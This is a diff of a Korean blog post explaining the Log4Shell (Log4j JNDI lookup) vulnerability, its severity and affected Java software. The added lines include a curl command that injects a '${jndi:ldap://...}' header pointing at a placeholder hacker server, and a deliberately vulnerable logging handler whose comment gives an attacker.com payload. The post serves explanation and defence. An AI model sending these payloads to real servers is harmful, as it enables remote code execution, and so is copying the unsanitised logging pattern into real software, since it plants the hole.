@@ -17,7 +17,7 @@ article_header:
 
 2021년 12월 10일  Log4j보안 취약점에 대한 긴급패치가 발표되었다.
 
-이번 발견된 Log4j취약점 `Log4Shell`은 2021년 11월 24일 Alibaba Cloud 보안팀으로 부터 발견된 Zero-Day[^1] 취약점으로 뉴스에서 발표될 당시에는 이미 취약점 패치를 진행한 후 발표된 One-Day[^2] 취약점인 상태였다.
+이번 발견된 Log4j취약점 `Log4Shell`은 2021년 11월 24일 Alibaba Cloud 보안팀으로 부터 발견된 <u>Zero-Day</u>[^1] 취약점으로 뉴스에서 발표될 당시에는 이미 취약점 패치를 진행한 후 발표된 <u>One-Day</u>[^2] 취약점인 상태였다.
 
 KISA : [Apache Log4j 2 보안 업데이트 권고](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)
 
@@ -35,21 +35,83 @@ Log4j는 Apache Software Foundation에서 개발한 인기있는 [로깅 유틸�
 
 전 세계 수 많은 서비스들이 Log4j를 이용하고 있으며 자바 프로그래밍 초보시절 `system.out.println("debug : " + str)` 로 디버깅 하던 것 대신, `log.info("debug {}", str)`하라고 조언 받은것 처럼 널리 사용하고 있는 라이브러리이다.
 
+따라서, 자바로 개발한 환경(개발 코드, 사이드 솔루션 등등..)에서 모두 점검해봐야 한다. 일반적으로 자바로 개발된 서버 사이드 솔루션은 다음과 같다.
+
+`Tomcat`, `JBoss`, `Jenkins`, `ElasticSearch`, `Hadoop`, `Kafka`, `Spark`.....
+
+
+
 
 
 -----
 
-## Log4j 취약점
+## Log4j 취약점 & 동작원리
 
-현재 문제가 있는 log4j 라이브러리는 `log4j-core-<version>jar`이며, Log4j가 넘겨받은 변수를 그대로 로깅하는 것이 아니라 해당 변수를 분석해 할 수 있는 경우 실행하는 `Lookups` 기능에서 발견되었다.
+현재 문제가 있는 log4j 라이브러리는 `log4j-core-<version>jar`이며, Log4j가 로그를 출력할 경우 <u>로그에 사용자ID등이 있을 때</u>[^3] 자동으로 내부에 운영중인 LDAP 서버등에 접속을 해서 변환하는 기능(Lookups 기능)이 존재한다. 이때 취약점이 발현되어 해커의 서버로 접속하여 악성코드를 서버로 다운로드하고 이 코드를 실행하여 서버가 탈취된다.
 
-예를들어, `log.info("Debug: {}", str)`에서 **str**이 **${env:USER}**라면 **USER**가 누군지 찾아서, `Debug: eli_ez3r`라고 문구를 완성하고 해당 문구를 출력하는 경우이다.
+예를들어 로그를 남길 때 다음과 같이 남긴다고 하면
+
+```java
+log.info("Request User Agent: {}", request.getHeader("X-Api-Version"));
+```
+
+해커가 악의적으로 HTTP의 Header, X-Api-Version 값에 해커의 주소로 설정한 다음 다음과 같은 요청을 보내면 해커 위와 같은 동작원리로 인해 해커 서버로 요청을 전송하는 방식이다.
+
+```shell
+curl [Victim IP:PORT] -H 'X-Api-Version: ${jndi:ldap://[HACKER SERVER]}'
+```
+
+서버의 log4j로그를 살펴보면 다음과 같은 로그가 남아 있다. (**...WARN Error looking up JNDI resource [ldap://hacker-server]...**)
+
+```
+2021-12-12 07:19:17.375 WARN 1 --- [nio-8080-exec-1] .w.s.m.s.DefaultHandlerExceptionResolver : 
+Resolved [org.springframework.web.bind.MissingRequestHeaderException: Required request header 'X-Api-Version' for method parameter type String is not present]
+2021-12-12 07:19:34,650 http-nio-8080-exec-2 WARN Error looking up JNDI resource [ldap://hacker-server]. javax.naming.CommunicationException: 
+hacker-server:389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
+```
+
+
 
 현재 취약점은 Lookups기능 중에서도 특히 **JDNI**라는 Lookups을 이용해 공격이 가능하다.
 
 Apache Log4j 2의 일부 기능에는 **재귀 분석 기능(Recursive Analysis Functions)**이 있기 때문에 공격자가 직접 악성 요청을 구성하여 **원격 코드 실행 취약점(RCE)**을 유발시킬 수 있어 **CVSS스코어 10점**으로 가장 높은 심각도를 나타내고 있다.
 
 취약점 악용에는 특별한 구성이 필요하지 않으며, Alibaba Cloud 보안팀의 검증결과 Apache Struts2, Apache Solr, Apache Druid, Apache Flink 등이 모두 영향을 받는 것으로 알려있다.
+
+
+
+재현 가능한 코드는 다음과 같다. (참조 : https://www.lunasec.io/docs/blog/log4j-zero-day/)
+
+```java
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+import java.io.*;
+import java.sql.SQLException;
+import java.util.*;
+
+public class VulnerableLog4jExampleHandler implements HttpHandler {
+  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
+
+  /**
+   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
+   * This is pseudo-code to explain the vulnerability, and not a full example.
+   * @param he HTTP Request Object
+   */
+  public void handle(HttpExchange he) throws IOException {
+    String apiVersion = he.getRequestHeader("X-Api-Version");
+
+    // This line triggers the RCE by logging the attacker-controlled HTTP header.
+    // The attacker can set their X-Api-Version header to: ${jndi:ldap://attacker.com/a}
+    log.info("Requested Api Version:{}", apiVersion);
+
+    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
+    he.sendResponseHeaders(200, response.length());
+    OutputStream os = he.getResponseBody();
+    os.write(response.getBytes());
+    os.close();
+  }
+}
+```
 
 
 
@@ -93,10 +155,10 @@ Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 �
 
 하지만 그 외에도 아래와 같은 점들 때문에 **사상 최악의 취약점**이라고 불려지고 있다.
 
-1. Log4j는 자바 기반의 소프트웨어에서 굉장히 많이 쓰여지고 있는 라이브러리이다. => 공격 대상/범위가 광범위하다
-2. 공격 방법이 간단하다. => 복잡한 과정없이 POC코드를 전송하기만 하면 공격이 성공한다.
-3. 하나의 소프트웨어는 여러개의 소프트웨어가 조합되어 만들어지는데, 그중 한곳에서라도 Log4j를 사용하게 되면, 해당 소프트웨어는 취약하다.
-4. 내 서버가 이미 공격을 당했는지 분석하기 위해서는 Log4j를 사용한 시점부터 분석해야 한다. => 10년 넘게 Log4j를 사용했다면?
+1. Log4j는 자바 기반의 소프트웨어에서 굉장히 많이 쓰여지고 있는 라이브러리이다. **=> 공격 대상/범위가 광범위하다.**
+2. 공격 방법이 간단하다. **=> 복잡한 과정없이 POC코드를 전송하기만 하면 공격이 성공한다.**
+3. 하나의 소프트웨어는 여러개의 소프트웨어가 조합되어 만들어지는데, 그중 한곳에서라도 Log4j를 사용하게 되면, 해당 소프트웨어는 취약하다. **=> Attack Vctor가 다양하다.**
+4. 내 서버가 이미 공격을 당했는지 분석하기 위해서는 Log4j를 사용한 시점부터 분석해야 한다. **=> 오랫동안 방치된 취약점으로 피해 범위 파악이 어렵다.**
 
 
 
@@ -197,9 +259,10 @@ Completed in 0.42 seconds
 
 -----
 
-출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA 침해사고분석단 취약점분석팀](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389), [Wiki](https://ko.wikipedia.org/wiki/Log4j)
+출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA 침해사고분석단 취약점분석팀](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389), [Wiki](https://ko.wikipedia.org/wiki/Log4j), [popit.kr](https://www.popit.kr/log4j-%EB%B3%B4%EC%95%88-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%8F%99%EC%9E%91%EC%9B%90%EB%A6%AC-%EB%B0%8F-jenkins-%EC%84%9C%EB%B2%84-%ED%99%95%EC%9D%B8-%EB%B0%A9%EB%B2%95/)
 
 
 
 [^1]:취약점이 알려지지 않거나, 관련 패치가 배포되지 않은 시기
 [^2]: 취약점 대응 패치가 배포된 시기
+[^3]: `log.info("Debug: {}", str)`에서 **str**이 **${env:USER}**라면 **USER**가 누군지 찾아서, `Debug: eli_ez3r`라고 문구를 완성하고 해당 문구를 출력하는 경우이다.
